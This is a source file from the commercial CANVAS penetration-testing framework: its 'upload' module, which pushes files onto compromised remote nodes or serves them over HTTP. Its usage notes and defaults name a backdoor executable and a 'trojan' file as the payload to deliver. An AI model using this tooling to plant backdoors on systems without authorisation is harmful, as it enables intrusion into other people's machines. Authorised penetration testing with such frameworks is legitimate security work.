#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2004
# http://www.immunityinc.com/CANVAS/ for more information

import sys
import time

# covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os, getopt
import socket

from exploitutils import *
from canvasexploit import canvasexploit
from localNode import localNode

from canvaserror import *


NAME="upload"
DESCRIPTION="Upload file. Uses first selected node."
DOCUMENTATION={}
DOCUMENTATION["CLINotes"]="""This is a useful command from the commandline that allows you to throw
up a quick HTTP server, using the upload module to send files to a remote server.
exploits/httpserver/httpserver.py -t 0.0.0.0 -O singleexploit:upload -p 8080 -O source:/tmp/rp.htm -O datatype:text/html
Or, for a binary file:
exploits/httpserver/httpserver.py -t 0.0.0.0 -O singleexploit:upload -p 8080 -O source:backdoors/backdoor.exe -O datatype:binary/octet-stream

"""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Commands"
PROPERTY['ARCH'] = [ ["Unix", "All"], ["Windows", "All"] ]


from httpclientside import httpclientside
from ExploitTypes.localcommand import LocalCommand

class theexploit(LocalCommand,httpclientside):
    def __init__(self):
        canvasexploit.__init__(self)
        httpclientside.__init__(self)
        self.result            = ""
        self.supportedNodeArgs = [["ScriptNode","LocalNode","UnixShellNode","win32Node","linuxNode", "osxNode", "solarisNode"]]
        self.name              = NAME
        self.source            = "trojan"
        self.dest              = "" #same as source
        self.destfilename      = None
        self.sourcedata        = None

    def makesploit(self, clientheader, clientbody):
        """
        For use by exploits/httpserver/httpserver.py -O singleexploit:upload -O destfilename:testvuln
        """
        from libs.spkproxy import header, body
        h = header("SERVER")
        b = body()
        user_agent = clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s" % user_agent)

        if 1:
            self.log("Sending the trojan exe file")
            sploitstring = self.makedownloadfile()
            self.log("Sending %d bytes" % len(sploitstring))
            h.addHeader("Content-type", self.datatype)
            h.addHeader("Connection", "close")
            b.setBody(sploitstring)

        else:
            #redirect to self
            self.log("redirecting to self")
            h.status = "302"
            h.addHeader("Location", self.filename)
            h.addHeader("Content-Type", "text/html")

        return h,b


    def test(self):
        return 0

    def getargs(self):
        self.log("Getting args")
        self.source = self.argsDict.get("source", self.source)
        self.sourcedata = self.argsDict.get("sourcedata", self.sourcedata)
        self.dest = self.argsDict.get("dest", self.dest)
        self.destfilename = self.argsDict.get("destfilename", self.destfilename)
        self.datatype = self.argsDict.get("datatype", self.datatype)
        return

    def makedownloadfile(self):
        """
        If we were passed some sourcedata, we return that as the "file"
        otherwise we try to read from self.source and return the contents of
        that as the data.
        """
        self.getargs()
        if self.sourcedata:
            self.log("Returning sourcedata of length %d" % len(self.sourcedata))
            return self.sourcedata
        try:
            data = file(self.source,"rb").read()
        except:
            self.log("Could not load %s - returning null file" % self.source)
            data = ""
        return data

    def run(self):
        rv = 0
        results = []
        self.setInfo("%s (in progress)" % (NAME))
        self.getargs()

        if not self.source:
            msg = "No source file given to upload."
            self.log(msg)
            self.result = msg
            self.setInfo("%s - done (failed: %s)" % (NAME, msg))
            return 0

        self.log("Passednodes: %s" % self.argsDict["passednodes"])

        for node in self.argsDict["passednodes"]:
            # VCT student requested status messages
            if isinstance(node, localNode):
                self.log_error('localNode is not supported for upload (did you forget to select the remote node in Node Management?)')
                self.setInfo('Failed: localNode selected')
                continue

            _type = node.nodetype
            if _type in self.supportedNodeArgs[0] or "upload" in node.capabilities:
                self.log("Uploading %s onto node %s" % (self.source,node.getname()))

                try:
                    r = node.upload(self.source, destfilename = self.destfilename)
                    # installremotemosdefservice.py relies on upload.py and in such a
                    # case, the VFS node is an SMBShellServer. Unfortunately,
                    # SMBShellServer.upload() was written in a very _bad_ way.
                    # Consequently the only way we have currently to detect an error
                    # is by comparing strings because in this specific case, we
                    # do not raise any NodeCommandError exception but return an error
                    # string. o_O;;

                    if '[!] Could not upload file:' in str(r):
                        e = "Failed to upload on node %s: %s" % (node.getname(), str(r))
                        self.log(e)
                        results.append((False, e))
                    else:
                        results.append((True, str(r)))
                        if r == 1:
                            # This gives us a 'Success' in the Listener Shell window
                            # when SMBShellServer.upload() gets re-written this will
                            # need to be looked at
                            results.append((True, "Success"))
                except NodeCommandError, i:
                    e = "Failed to upload on node %s: %s" % (node.getname(), i)
                    self.log(e)
                    results.append((False, e))
            else:
                results.append((False, e))
                e = "%s node type not supported"%_type
                self.log(e)

        self.result = ", ".join([x[1] for x in results])

        if all([z[0] for z in results]):
            rv = 1
            self.setInfo("%s - done (success)" % (NAME))
        else:
            rv = 0
            self.setInfo("%s - done (failed: %s)" % (NAME, self.result))


        self.log("Upload finished")

        return rv


def usage():
    app = theexploit()
    print "Usage: "+sys.argv[0]+" [-T (for test)] -t target [-p port:"+str(app.port)+"] [-v version:1] -l localip -d localport "
    app.displayVersions()


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()

    try:
        (opts,args) = getopt.getopt(sys.argv[1:],"v:t:s:l:d:p:T")
    except getopt.GetoptError:
        usage()

    target    = ""
    localhost = ""
    localport = ""
    test      = 0
    for o,a in opts:
        if o in ["-t"]:
            target=a
        if o in ["-v"]:
            app.setVersion(int(a))
        if o in ["-l"]:
            localhost=a
        if o in ["-d"]:
            localport=a
        if o in ["-T"]:
            test=1
        if o in ["-p"]:
            app.setPort(int(a))

    if (not test and (target == "" or localhost == "" or localport == "")):
        print "ERROR: Target: %s Localhost: %s Localport: %s" % (target,localhost,localport)
        usage()

    app.setHost(target)
    if test:
        if target == "":
            usage()
        if app.test():
            print "Found!"
        sys.exit(1)


    app.run()
    #string = app.makesploit()
    #print string


